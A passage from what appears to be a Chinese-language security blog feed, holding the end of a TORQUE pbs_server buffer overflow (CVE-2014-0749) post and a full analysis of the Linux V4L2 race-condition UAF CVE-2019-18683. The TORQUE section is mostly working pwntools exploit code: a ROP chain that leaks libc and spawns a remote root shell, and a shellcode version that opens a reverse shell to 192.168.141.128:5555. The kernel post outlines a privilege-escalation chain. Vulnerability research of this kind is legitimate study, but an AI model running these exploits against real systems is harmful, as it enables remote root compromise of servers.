            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> \             <span class="c1"># socket句柄的fd=10
</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">got_snprintf</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> \      <span class="c1"># write(10, got_snprintf, 8) 泄露snprintf函数地址
</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> \            <span class="c1"># 让rsp 16字节对齐, 否则有些地方会段错误 ?????
</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">main_loop</span><span class="p">)</span>          <span class="c1"># 返回到main_loop函数继续监听
</span>
<span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span>
<span class="n">rp</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>

<span class="n">snprintf_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">rp</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>  <span class="c1"># 解析snprintf函数地址
</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">snprintf addr: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">snprintf_addr</span><span class="p">))</span>

<span class="n">libc</span> <span class="o">=</span> <span class="nc">LibcSearcher</span><span class="p">(</span><span class="sh">'</span><span class="s">snprintf</span><span class="sh">'</span><span class="p">,</span> <span class="n">snprintf_ad</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">snprintf_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="sh">'</span><span class="s">snprintf</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">libc base: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>              <span class="c1"># 计算libc基地址
</span>
<span class="n">dup2_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="sh">'</span><span class="s">dup2</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">dup2 addr: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">))</span>              <span class="c1"># 计算dup2函数地址
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">overflow_distance</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span> <span class="o">+</span> \       <span class="c1"># dup2(10, 0), socket句柄重定向到stdin
</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> \ 
            <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span> <span class="o">+</span> \       <span class="c1"># dup2(10, 1), socket句柄重定向到stdout
</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">main_loop</span><span class="p">)</span>           <span class="c1"># 返回main_loop函数继续监听
</span><span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span>
<span class="n">rp</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">overflow_distance</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">execv_plt</span><span class="p">)</span>           <span class="c1"># 执行execv("/bin/sh", NULL)获取远程shell
</span><span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span>
<span class="n">rp</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>

<span class="n">rp</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>rop方式获取远程root shell：</p>

<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/remote_root_shell.png" alt="remote root shell.png" /></p>

<h3 id="shellcode版本关闭nx">shellcode版本（关闭NX）</h3>

<p>shellcode解决方式，要关闭NX，效果是反弹shell到192.168.141.128主机的5555端口：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>

<span class="n">rp</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">172.17.0.2</span><span class="sh">"</span><span class="p">,</span> <span class="mi">15001</span><span class="p">)</span>

<span class="n">overflow_distance</span> <span class="o">=</span> <span class="mi">103</span>     <span class="c1"># 实际溢出长度为103
</span><span class="n">jmp_rsp</span> <span class="o">=</span> <span class="mh">0x40900d</span>

<span class="c1"># 反弹shell到远程5555端口
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="sh">"</span><span class="s">192.168.141.128</span><span class="sh">"</span><span class="p">,</span> <span class="mi">5555</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">dupsh</span><span class="p">())</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">*</span> <span class="n">overflow_distance</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">jmp_rsp</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span> 

<span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span>
<span class="n">rp</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<p>shellcode反弹shell：</p>

<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/shellcode%E6%89%93%E6%88%90%E5%8A%9F.png" alt="shellcode打成功.png" /></p>

<h1 id="参考资料">参考资料</h1>

<p>OSS公告：</p>

<p><a href="https://seclists.org/bugtraq/2014/May/75">Bugtraq: [CVE-2014-0749] TORQUE Buffer Overflow</a></p>

<p>torque的编译、安装、部署、使用</p>

<p><a href="https://www.jianghaizhi.com/bckf/1262.html">Torque安装部署以及使用方法详解</a></p>]]></content><author><name></name></author><category term="userspace" /><summary type="html"><![CDATA[漏洞位于pbs_server组件的tcp_gets函数。该函数从socket句柄读取TCP载荷，将获取的数据复制到栈上的时候没有进行数据检查造成栈溢出。 攻击者可以获取远程root shell]]></summary></entry><entry><title type="html">CVE-2019-18683 V4L2框架条件竞争漏洞分析</title><link href="http://localhost:4000/linux_kernel/2025/01/29/CVE-2019-18683-V4L2%E6%A1%86%E6%9E%B6%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" rel="alternate" type="text/html" title="CVE-2019-18683 V4L2框架条件竞争漏洞分析" /><published>2025-01-29T13:27:38+08:00</published><updated>2025-01-29T13:27:38+08:00</updated><id>http://localhost:4000/linux_kernel/2025/01/29/CVE-2019-18683-V4L2%E6%A1%86%E6%9E%B6%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</id><content type="html" xml:base="http://localhost:4000/linux_kernel/2025/01/29/CVE-2019-18683-V4L2%E6%A1%86%E6%9E%B6%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"><![CDATA[<p>CVE-2019-18683是Linux内核video4Linux2（V4L2）框架中一个高危的条件竞争漏洞。该漏洞源于videobuf2核心组件在内存映射（mmap）操作与缓冲区队列管理之间缺乏有效的同步机制，导致产生UAF漏洞。</p>

<h2 id="一环境搭建">一、环境搭建</h2>

<p>主机环境：Ubuntu 18.04</p>

<p>内核版本：linux 5.4.0-rc2</p>

<p>对.config文件进行如下配置，确保和漏洞相关的所有组件编译进内核：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">CONFIG_VIDEO_DEV</span><span class="o">=</span><span class="n">y</span>
<span class="n">CONFIG_VIDEO_V4L2</span><span class="o">=</span><span class="n">y</span>
<span class="n">CONFIG_VIDEO_VIVID</span><span class="o">=</span><span class="n">y</span>
</code></pre></div></div>

<p>编译安装内核：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/linux-5.4-rc2<span class="nv">$ </span>make menuconfig
/linux-5.4-rc2<span class="nv">$ </span>make <span class="nt">-j8</span>
/linux-5.4-rc2<span class="nv">$ </span><span class="nb">sudo </span>make modules_install
/linux-5.4-rc2<span class="nv">$ </span><span class="nb">sudo </span>make <span class="nb">install</span>
</code></pre></div></div>

<p>安装完成后重启系统，在/dev目录下出现video0和video1两个设备：</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/1.png" alt="截屏2025-01-17 10.00.34.png" /></p>

<h2 id="二v4l2框架介绍">二、V4L2框架介绍</h2>

<p>V4L2是video for linux version 2的简写，是Linux内核里面用于视频采集的框架。</p>

<p>该框架设计的目的是，为市面上型号繁杂的摄像头提供统一的接入方式，在内核层面抽象出调用框架，以内核API的形式提供给驱动开发者使用。用户态层面通过read/write、ioctl命令、mmap内存映射等系统调用，操作V4L2框架，实现摄像头的开启/关闭、取流/停止、摄像头参数修改、摄像头信息读取等功能。</p>

<p>框架结构如图所示，hardware层是针对不同的SoC芯片的驱动程序，主要包括硬件编码解码、图像画质的硬件处理、控制命令接口等功能。</p>

<p>external device层是连接的摄像头外设，通过USB、I2C、SPI、GPIO接口与SoC进行控制连接，通过MIPI图像传输接口与SoC进行图像传输连接。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/2.png" alt="截屏2025-01-17 10.38.24.png" /></p>

<p>v4l2-core目录是整个框架的核心，实现了内核API，实现了系统调用。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/3.png" alt="截屏2025-01-17 11.06.54.png" /></p>

<p>platform目录是不同SoC芯片的图像驱动，实现了hardware层功能。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/4.png" alt="截屏2025-01-17 11.07.47.png" /></p>

<p>CVE-2019-18683漏洞位于platform/vivid目录，是V4L2框架实现的自测驱动，该漏洞是通过syzkaller进行fuzz的时候发现的。</p>

<p>vivid驱动用于模拟外接视频源，使用vivid就可以不用外接摄像头来测试框架功能了。</p>

<h2 id="三漏洞原理">三、漏洞原理</h2>

<p>vivid模拟外接视频源的核心函数是vivid_thread_vid_cap。</p>

<p>打开取流后，该函数运行在内核线程上，源源不断向用户态申请的缓冲区复制随机生成的“视频帧”。在for无限循环中，生成并复制帧的操作是在dev→mutex信号量的保护之下的。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/5.png" alt="截屏2025-01-17 14.10.41.png" /></p>

<p>停止取流的操作中，主线程调用vivid_stop_generating_vid_cap杀掉vivid_thread_vid_cap内核线程，停止取流。</p>

<p>主线程进入到vivid_stop_generating_vid_cap函数之前，也是被dev→mutex信号量保护的，所以在vivid_stop_generating_vid_cap调用mutex_unlock释放信号量之前，vivid_thread_vid_cap内核线程实际上是一直在for循环中等待获取信号量的。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/6.png" alt="截屏2025-01-17 14.11.23.png" /></p>

<p>那么为何vivid_stop_generating_vid_cap要先解锁，才杀掉内核线程呢？</p>

<p>我认为，作者是想让vivid_thread_vid_cap内核线程最后一次执行完视频的生成，把那轮for循环执行结束再杀掉内核线程。</p>

<p>但是，如果vivid_stop_generating_vid_cap解锁之后，信号量没有被vivid_thread_vid_cap抢到，而是被vb2_fop_read抢走，那么vb2_fop_read会将那些因停止取流而标记为“待释放”的vb2_buffer重新加入活动链表。close的时候“待释放”的vb2_buffer会被kfree掉，但是由于它们还同时存在于活动链表中，另一个线程有可能继续操作活动链表，造成UAF。</p>

<p>该漏洞的竞争情况极为复杂，角度很刁钻，即使是漏洞发现者，也没有讲清楚里面的细节，只知道该漏洞的效果是造成kmalloc-1k对象的UAF。</p>

<h2 id="四条件竞争漏洞的测试方法">四、条件竞争漏洞的测试方法</h2>

<p>要分析条件竞争漏洞的触发原理，弄清楚多个线程之间的竞争窗口是一件不容易的事情。</p>

<p>一个常见的情况是，通过syzkaller打出了UAF，分析造成UAF的原因。</p>

<p>可以在锁操作语句的后面插入printk函数，打印系统的jiffies节拍、线程号等信息，直观的显示出哪个线程在哪个时间进入到了临界区，由此分析线程之间的竞争关系。</p>

<p>在这个漏洞中，syzkaller给出的poc主要逻辑是，创建2个线程分别绑定不同的cpu，每个线程都运行如下的for循环，若干循环之后触发UAF。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/7.png" alt="截屏2025-01-17 15.33.51.png" /></p>

<p>重点要关注线程A、线程B之间的read和close系统调用如何竞争。</p>

<p>对read系统调用的信号量操作插桩如下：</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/8.png" alt="截屏2025-01-17 15.49.23.png" /></p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/10.png" alt="截屏2025-01-17 15.58.10.png" /></p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/11.png" alt="截屏2025-01-17 16.02.09.png" /></p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/9.png" alt="截屏2025-01-17 15.52.26.png" /></p>

<p>对close系统调用的信号量操作插桩如下：</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/12.png" alt="截屏2025-01-17 16.06.36.png" /></p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/13.png" alt="截屏2025-01-17 21.11.08.png" /></p>

<p>dmesg日志分析：</p>

<p>第二列的数字表示jiffies节拍，jiffies是时钟中断计数器，cpu每到一次时钟中断，jiffies递增1，同时完成1次进程切换。</p>

<p>所以在打印日志中，jiffies的数值表示了两个线程运行的先后。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/14.png" alt="截屏2025-01-17 19.09.24.png" /></p>

<p>上图是一次成功的竞争过程中输出的日志，条件竞争的步骤是：
第一步，206线程首先进入vb2_fop_read获取信号量，在vb2_ops_wait_prepare函数中释放信号量；</p>

<p>第二步，207线程进入vb2_fop_read获取信号量，完整执行了read系统调用后，进入到close系统调用，并且在漏洞点vivid_stop_generating_vid_cap函数中释放了信号量。</p>

<p>第三步，206线程重新获取信号量，在vb2_core_qbuf函数中调用vid_cap_buf_queue函数，把vb2_buffer对象加入到vid_cap_active链表中。206线程执行完整个read系统调用释放信号量；</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/15.png" alt="截屏2025-01-17 21.31.56.png" /></p>

<p>第四步，207线程在vivid_stop_generating_vid_cap函数中重新获取信号量，后面进入到vb2_core_reqbufs函数，将vb2_buffer对象释放。此时的vb2_buffer对象虽然已经kfree掉了，但是vid_cap_active链表仍然保留着对它的引用；</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/16.png" alt="截屏2025-01-17 20.54.04.png" /></p>

<p>第六步，206线程执行close系统调用；</p>

<p>第七步，207线程开始了新的一轮open-read-close循环，重新进入到vb2_fop_read函数，在vid_cap_buf_queue函数中发生释放后重引用；</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/17.png" alt="截屏2025-01-17 21.40.41.png" /></p>

<p>原因是新的一轮vb2_fop_read申请了一个新的vb2_buffer对象，并且要把新的vb2_buffer对象加入到vid_cap_active链表中。</p>

<p>由于vid_cap_active链表中已经链接了一个已被释放的vb2_buffer对象，所以进行list_add_tail操作导致了新的vb2_buffer对象地址写入到已被释放的对象中，触发了UAF。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/18.png" alt="截屏2025-01-17 21.42.28.png" /></p>

<h2 id="五漏洞利用">五、漏洞利用</h2>

<h3 id="信息泄漏">信息泄漏</h3>

<p>在正式触发UAF之前，会首先触发WARN_ON语句，泄漏内核栈地址指针rsp和指向内核代码段地址的rcx寄存器。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/19.png" alt="截屏2025-01-19 15.22.42.png" /></p>

<p>WARN_ON语句位于__vb2_queue_cancel函数，位于调用close的过程中。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/20.png" alt="截屏2025-01-19 15.19.16.png" /></p>

<h3 id="控制流劫持">控制流劫持</h3>

<p>UAF的对象是vb2_buffer，目标是劫持vb2_buffer→vb2_queue→mem_ops→vaddr(void *buf_priv)</p>

<p>其中函数指针vaddr的参数正是vb2_buffer.planes[n].mem_priv指针的值。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/v4l2_objects.png" alt="v4l2_objects.png" /></p>

<p>构造内核对象可以放在内核栈上面，内核栈的基地址由WARN_ON语句泄漏的rsp寄存器计算得到。</p>

<p>目标明确为：</p>

<ol>
  <li>在内核栈构造vb2_queue对象，使得vb2_queue.mem_ops指向第2步构造的vb2_mem_ops；</li>
  <li>在内核栈构造vb2_mem_ops对象，其中vb2_mem_ops.vaddr指向rop gadget，用于劫持rip到内核栈；</li>
  <li>在内核栈构造rop chain，实现提权；</li>
  <li>堆喷射fake vb2_buffer对象，覆盖已经被UAF对象，其中vb2_buffer.planes[0].mem_priv指向rop chain。</li>
</ol>

<p>在内核栈构造内容基于的原理是，adjtimex()这类系统调用会把用户态内容copy_from_user到内核栈上面，再结合userfaultfd技术即可实现在内核栈构造任意内容。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/v4l2_payload.png" alt="v4l2_payload.png" /></p>

<p>调用read即可触发控制流劫持，函数调用链条是：</p>

<p>vb2_fop_read —&gt; vb2_read —&gt; __vb2_perform_fileio —&gt; __vb2_init_fileio —&gt; vb2_plane_vaddr</p>

<p>—&gt; fake vaddr</p>

<p>控制流劫持的效果是rip指针被劫持到内核栈rop chain区域，执行用于提权的rop chain。</p>

<p>rop chain的内容是执行内核函数run_cmd(”/bin/sh  /home/a13x/pwn”)，该函数由内核态发起，执行用户态命令，具有root权限。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/21.png" alt="截屏2025-01-19 16.42.42.png" /></p>

<h2 id="六漏洞修补">六、漏洞修补</h2>

<p>漏洞修补思路是用信号量完整的保护vivid_stop_generating_vid_cap函数杀掉vivid_thread_vid_cap内核线程的整个过程。</p>

<p>vivid_stop_generating_vid_cap函数去掉了中间加锁和解锁的步骤，使得整个过程被dev→mutex全程保护。</p>

<p>vivid_thread_vid_cap函数for循环中尝试去获取dev→mutex信号量，如果获取失败，那么线程睡眠1秒，线程醒来后continue循环，再次尝试获取dev→mutex，如此往复直到获取信号量。若检测到线程被杀掉，kthread_should_stop()返回ture，循环结束。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/22.png" alt="截屏2025-01-18 19.03.02.png" /></p>]]></content><author><name></name></author><category term="linux_kernel" /><summary type="html"><![CDATA[CVE-2019-18683是Linux内核video4Linux2（V4L2）框架中一个高危的条件竞争漏洞。该漏洞源于videobuf2核心组件在内存映射（mmap）操作与缓冲区队列管理之间缺乏有效的同步机制，导致产生UAF漏洞。]]></summary></entry></feed>